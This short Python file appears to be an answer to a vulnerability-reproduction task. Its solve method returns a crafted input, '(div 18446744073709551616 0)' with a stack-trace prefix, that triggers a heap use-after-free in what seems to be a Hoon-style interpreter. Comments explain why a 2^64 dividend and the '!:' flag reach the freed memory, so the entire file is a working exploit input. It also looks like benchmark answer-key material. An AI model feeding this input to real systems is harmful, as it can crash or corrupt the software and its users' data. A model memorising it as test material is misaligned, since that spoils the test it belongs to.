import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Triggers Heap Use-After-Free in division by zero logic.
        # We need a heap-allocated atom (indirect atom, > 62 bits) as the dividend.
        # 18446744073709551616 is 2^64.
        # '!: ' enables stack trace, which forces access to the freed operand.
        return b"!:  (div 18446744073709551616 0)"